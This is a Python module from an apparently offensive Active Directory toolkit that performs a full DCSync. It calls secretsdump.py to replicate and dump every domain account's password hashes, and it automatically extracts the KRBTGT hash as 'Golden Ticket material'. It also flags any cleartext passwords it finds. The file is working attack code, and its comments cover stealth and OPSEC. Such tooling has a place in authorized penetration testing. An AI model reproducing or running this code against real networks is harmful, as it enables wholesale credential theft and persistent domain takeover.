"""
Full DCSync — Complete domain credential dump via DRS replication.

WARNING: Generates significant replication traffic. Use TargetedDCSync
when stealth matters. This mode extracts all user and machine accounts.
"""

import os
import subprocess
from pathlib import Path
from typing import Optional

from ..core.auth import AuthBuilder


class FullDCSync:
    """Dump all domain credentials via full DCSync replication."""

    def __init__(self, auth: AuthBuilder, output_dir: Path):
        self.auth = auth
        self.output_dir = output_dir
        self.krbtgt_material: dict = {}

    def extract(self, include_machine_accounts: bool = True) -> str:
        """
        Full domain credential dump. Returns path to .ntds hash file
        on success, empty string on failure.
        """
        print(f"\n{'=' * 60}")
        print("FULL DCSYNC — COMPLETE DOMAIN DUMP")
        print(f"{'=' * 60}")
        print("[!] WARNING: Full dump generates significant traffic")
        print("[!] Use targeted_dcsync for OPSEC-sensitive operations")

        auth_args = self.auth.build()
        if not auth_args:
            return ""

        output_prefix = str(self.output_dir / "full_dcsync")
        cmd = ["secretsdump.py"] + auth_args + [
            "-just-dc",
            "-outputfile", output_prefix,
        ]

        if not include_machine_accounts:
            cmd.append("-just-dc-ntlm")

        try:
            print("[*] Executing full DCSync (this may take several minutes)...")
            print(f"[*] Command: {' '.join(cmd)}")

            subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            ntds_file = f"{output_prefix}.ntds"
            if os.path.exists(ntds_file):
                self._print_results(ntds_file, output_prefix)
                return ntds_file

            print("[-] Full DCSync failed — no output file created")
            return ""

        except subprocess.TimeoutExpired:
            print("[-] DCSync timed out (>10 minutes) — try targeted mode")
            return ""
        except Exception as e:
            print(f"[-] Error: {e}")
            return ""

    def _print_results(self, ntds_file: str, output_prefix: str):
        """Parse and display full dump results."""
        with open(ntds_file) as f:
            lines = f.readlines()

        hash_count = sum(1 for l in lines if ":::" in l)
        user_hashes = [l for l in lines if ":::" in l and "$" not in l.split(":")[0]]
        machine_hashes = [l for l in lines if ":::" in l and "$" in l.split(":")[0]]

        print(f"\n[+] ★ FULL DCSYNC COMPLETE ★")
        print(f"[+] Total hashes extracted: {hash_count}")
        print(f"[+] Output file: {ntds_file}")
        print(f"[+] User accounts: {len(user_hashes)}")
        print(f"[+] Machine accounts: {len(machine_hashes)}")

        # Auto-extract KRBTGT
        for line in lines:
            if line.lower().startswith("krbtgt:"):
                parts = line.strip().split(":")
                if len(parts) >= 4:
                    self.krbtgt_material = {
                        "ntlm": parts[3],
                        "rid": parts[1],
                        "lm": parts[2],
                    }
                    print(f"\n[!] ★ KRBTGT HASH: {parts[3]}")
                    print("[!] Golden Ticket material extracted automatically")

        # Check supplementary files
        kerberos_file = f"{output_prefix}.ntds.kerberos"
        if os.path.exists(kerberos_file):
            print(f"[+] Kerberos keys: {kerberos_file}")

        cleartext_file = f"{output_prefix}.ntds.cleartext"
        if os.path.exists(cleartext_file):
            print(f"[!] ★ CLEARTEXT PASSWORDS FOUND: {cleartext_file}")
            print("[!] Reversible encryption is enabled on some accounts!")